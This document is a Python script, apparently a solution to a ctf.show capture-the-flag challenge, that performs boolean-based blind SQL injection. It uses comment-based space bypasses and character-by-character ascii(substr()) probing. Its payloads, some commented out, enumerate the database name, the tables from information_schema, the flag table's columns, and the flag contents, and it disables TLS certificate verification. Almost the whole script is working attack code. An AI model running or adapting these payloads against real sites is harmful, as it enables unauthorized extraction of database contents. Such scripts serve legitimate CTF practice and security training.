import requests

url = 'https://318203b8-480f-4a41-a2da-ecd5940d87bc.challenge.ctf.show/index.php?id=-1/**/or/**/'
name = ''

# 循环45次( 循环次数按照返回的字符串长度自定义)
for i in range(1, 45):
    # 获取当前使用的数据库
    # payload = 'ascii(substr(database()from/**/%d/**/for/**/1))=%d'
    # 获取当前数据库的所有表
    # payload = 'ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d'
    # 获取flag表的字段
    # payload = 'ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d'
    # 获取flag表的数据
    payload = 'ascii(substr((select/**/flag/**/from/**/flag)from/**/%d/**/for/**/1))=%d'
    count = 0
    print('正在获取第 %d 个字符' % i)
    # 截取SQL查询结果的每个字符, 并判断字符内容
    for j in range(31, 128):
        requests.packages.urllib3.disable_warnings()
        result = requests.get(url + payload % (i, j), verify=False) # 忽略证书（不安全）

        if 'If' in result.text:
            name += chr(j)
            print('数据库名/表名/字段名/数据: %s' % name)
            break

        # 如果某个字符不存在,则停止程序
        count += 1
        if count >= (128 - 31):
            exit()